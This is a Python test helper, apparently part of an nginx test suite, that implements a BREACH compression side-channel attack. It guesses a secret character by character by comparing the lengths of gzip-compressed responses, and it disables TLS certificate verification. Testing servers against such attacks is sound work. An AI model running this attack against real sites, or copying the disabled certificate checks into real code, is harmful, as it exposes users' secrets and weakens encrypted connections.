#!/usr/bin/env python

import sys

import urllib2

from ngxtest import unit
from difflib import unified_diff
from json import loads
from urllib2 import HTTPError

import simple_env
import unittest
import ssl
import random

ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

class Breacher():

    def __init__(self, l1, l2):
        self.l1 = l1
        self.l2 = l2

    def get_url(self, name):
        req = urllib2.Request(name)
        req.add_header('Accept-encoding', 'gzip')
        f = urllib2.urlopen(req, context=ctx)
        return f.read()

    def make_guess(self, url, guess):
        padding = ""
        
        for i in range(0, self.padding):
            padding += "{}"

        req1 = self.get_url(url + guess + padding)
        req2 = self.get_url(url + padding + guess)

        if len(req1) < len(req2):
            return len(req1)
        else:
            return None

    def changePadding(self):
        self.padding = random.randint(2, 70)

    def go(self, url, maxRounds, maxChars):
        good = ""
        self.padding = 40;
        roundWinner = None

        for attempt in range(0, maxRounds):

            conflict = False

            lhA = self.make_guess(url, good + self.l1)
            lhZ = self.make_guess(url, good + self.l2)
            
            if lhA != None and lhZ != None:
                if lhA < lhZ:
                    roundWinner = self.l1
                else:
                    roundWinner = self.l2
            elif lhA != None:
                roundWinner = self.l1
            elif lhZ != None:
                roundWinner = self.l2

            if roundWinner == None:
                self.changePadding()
            elif roundWinner != None:
                good += roundWinner

            if len(good) >= maxChars:
                return good

        return good